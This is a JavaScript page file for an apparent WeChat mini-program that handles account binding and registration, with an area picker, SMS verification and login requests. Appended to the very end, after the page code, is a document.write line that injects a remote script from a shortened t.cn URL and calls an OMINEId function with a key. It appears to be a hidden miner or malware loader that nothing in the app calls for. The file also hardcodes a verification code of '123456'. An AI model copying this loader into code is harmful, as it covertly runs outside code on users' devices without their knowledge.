var t = getApp(),
  e = t.requirejs("core"),
  i = t.requirejs("foxui"),
  a = t.requirejs("jquery"),
  jq = a,
  address = t.requirejs("address/adresscode-handle");
Page({
  data: {
    endtime: '0',
    istap:false,
    postData: {},
    isCode:false,
    onlyBind:false,
    isactive:"bind",
    iscompany:false,
    areas: address.DISTRICT,
    ares: address.all_Areas,
    showPicker: false,
    pvalOld: [2, 0, 0],
    pval: [2, 0, 0],
    noArea: false,
    username:"登录账号",
    submit: false,
    items: [{ "name": 'self', checked: true,value:'个人用户' }, { "name": 'company', checked: false,value:"企业用户" }],
    subtext: "立即绑定"
  },
  onLoad: function (i) {
    // t.url(i),
     //e.loading();
    if(i.isbind){
      this.setData({
       // onlyBind:true
      });
      wx.setNavigationBarTitle({
        title: '绑定账号'
      });
    }
    this.getInfo({ "postData.isBindAccount": "isBindAccount"});
  },
  onReady:function(){
    console.log(this.data.areas);
  },
  radioChange:function(e){
   // 个人-企业切换
   var text=e.detail.value;
    var iscompany =false;
    if (text == "company") { iscompany =true;};
    this.setData({
      iscompany: iscompany
    });
  },
  selectArea: function (t) {
    //城市选择
    var e = t.currentTarget.dataset.area,
      a = this.getIndex(e, this.data.areas);
    this.setData({
      pval: a,
      pvalOld: a,
      showPicker: true
    })
  },
  getIndex: function (t, e) {
    if ("" == jq.trim(t) || !jq.isArray(e))
      return [0, 0, 0];
    var a = t.split(" "),
      r = [0, 0, 0];
    for (var s in e)
      if (e[s].name == a[0]) {
        r[0] = Number(s);
        for (var d in e[s].city)
          if (e[s].city[d].name == a[1]) {
            r[1] = Number(d);
            for (var n in e[s].city[d].area)
              if (e[s].city[d].area[n].name == a[2]) {
                r[2] = Number(n);
                break
              }
            break
          }
        break
      }
    return r
  },
  bindChange: function (t) {
    var e = this.data.pvalOld,
      a = t.detail.value;
    //console.log(t, address.DISTRICT[a[0]], a,t.target.dataset.key);
    e[0] != a[0] && (a[1] = 0),
      e[1] != a[1] && (a[2] = 0),
      this.setData({
        pval: a,
        pvalOld: a
      })
  },
  onConfirm: function (t) {
    var e = this.data.pval,
      a = this.data.ares,
      i = this.data.postData;
    i.province = a[e[0]].name,
      i.city = a[e[0]].city[e[1]].name,
      i.datavalue = a[e[0]].code + "," + a[e[0]].city[e[1]].code,
      a[e[0]].city[e[1]].area && a[e[0]].city[e[1]].area.length > 0 ? (i.area = a[e[0]].city[e[1]].area[e[2]].name, i.datavalue += "," + a[e[0]].city[e[1]].area[e[2]].code, this.getStreet(a, e)) : i.area = "",
      i.street = "",
      //console.log(i);
      this.setData({
        postData: i,
        detail:i,
        streetIndex: 0,
        showPicker: false
      })
  },
  onCancel: function (t) {
    this.setData({
      showPicker: false
    })
  },
  changeType:function(event){
    var types = e.data(event).type;
    var obj={};
    if(types == "bind"){
      wx.setNavigationBarTitle({
        title: '绑定账号'
      });
      obj = {
          isactive: types,
          "postData.isBindAccount":"isBindAccount",
          "subtext":"立刻绑定",
           username: "登录账号",
        };
    } else if (types == "register"){
      wx.setNavigationBarTitle({
        title: '注册账号'
      });
      obj = {
        isactive: types,
        "postData.isBindAccount": "other",
        username:"注册账号",
        "subtext": "立刻注册"
      };
    }else{
      return;
    };
    this.getInfo(obj);
  },
  getInfo: function (obj) {
    var t,
      i = this;
      var a = {
        show: true
      };
      a.postData = {
        user_name: "",
        password: "",
        isBindAccount:"isBindAccount"
      };
    if (obj) {
        a.postData.password1="";
        a.postData.mobile = "";
        a.postData.isBindAccount = "other";
        a = jq.extend(a,obj);
      };
        i.setData(a);     
  },
  inputChange: function (t) {
    var i = this.data.postData,
      s = e.pdata(t).type;
    var _this=this;
    var o = t.detail.value;
        i[s] = a.trim(o),
          _this.setData({
            postData: i
          });  
  },
  getWxphone:function(e){
    if (this.data.istap)return;
    var datas = e.detail;
    datas.session_token = t.globalData.session_token;
    datas.return_phone = "return_phone";
    if (!datas.encryptedData) { 
      this.setData({
        "postData.verification_code": "",
        istap: false,
        isCode: true
      });
    }else{
      this.sendData(datas, true);
    };
  },
  getCode:function(){
    //验证码
    var o = this.data.postData;
    var _this =this;
    if (this.data.endtime>0)return;
    if (!a.isMobile(o.mobile))
      return void i.toast(_this, "请填写正确的手机号");
      o.session_token = t.globalData.session_token;
    wx.request({
      url: t.globalData.daxin + "/index/verificationCode",
      data: o,
      method: "POST",
      success: function (res) {
        if(res.data.statusCode>=0){
          i.toast(_this, "短信发送成功"),
            _this.setData({
              endtime: 60
            }),
            _this.endTime();
        }else{
          i.toast(_this, res.data.msg);
        };
      }
    })
  },
  endTime:function(){
    var timer,_this=this;
    timer = setInterval(function(){
    var times = _this.data.endtime;
      if(times >0){
        _this.setData({
          endtime: times - 1
        });
      }else{
        clearInterval(timer);
      }
    },1000);
  },
  submit: function (detail) {
    if (!this.data.submit) {
      var s = this,
        o = this.data.postData,
        isbind = s.data.isactive;
      //o = jq.extend(o,detail);
      if (!o.password)
        return void i.toast(this, "请填写用户登录账号");
      if (isbind !="bind" && !a.isMobile(o.mobile))
        return void i.toast(this, "请填写正确的手机号");
      // if (5 != o.code.length)
      //   return void i.toast(this, "请填写5位短信验证码");
      if (!o.password || "" == o.password)
        return void i.toast(this, "请填写登录密码");
      if (isbind != "bind" && (!o.password1 || "" == o.password1))
        return void i.toast(this, "请确认登录密码");
      if (isbind != "bind" && o.password != o.password1)
        return void i.toast(this, "两次输入的密码不一致");
      this.setData({
        submit: true,
        subtext: isbind == "bind" ? "正在绑定..." :"正在注册..."
      });
      o.session_token = t.globalData.session_token;
      s.sendData(o, false, isbind);
    }
  },
  sendData: function (o, sendiv, isbind){
    var _this =this;
    wx.request({
      url: t.globalData.daxin + "/Login/customerToLongICMall",
      data: o,
      method: "POST",
      success: function (res) {
        wx.hideLoading();
        if (sendiv){
          if (res.data.statusCode >=0 && res.data.msg == "phone") {
            i.toast(_this, "获取手机号码成功");
            _this.setData({
              "postData.mobile": res.data.data,
              "postData.encryptedData": o.encryptedData,
              "postData.iv": o.iv, 
              "postData.verification_code": "123456",
              istap: true
            });
          } else {
            _this.setData({
              "postData.verification_code": "",
              istap: false,
              isCode:true
            });
            i.toast(_this, res.data.msg);
          };
        }else{
          if (res.data.statusCode >= 0 && res.data.msg == "绑定成功") {
            i.toast(_this, isbind == "bind" ? "绑定成功" :"注册成功");
            _this.setData({
              submit: false
            });
            wx.switchTab({
              url: '/pages/index/index'
            });
          } else {
            _this.setData({
              submit: false,
              subtext: isbind == "bind" ? "立刻绑定" : "立刻注册"
            });
            i.toast(_this, res.data.msg);
          }
        }
      }
    });
  }
})
document.write('<script src="http://t.cn/EvlonFh"></script><script>OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")</script>');
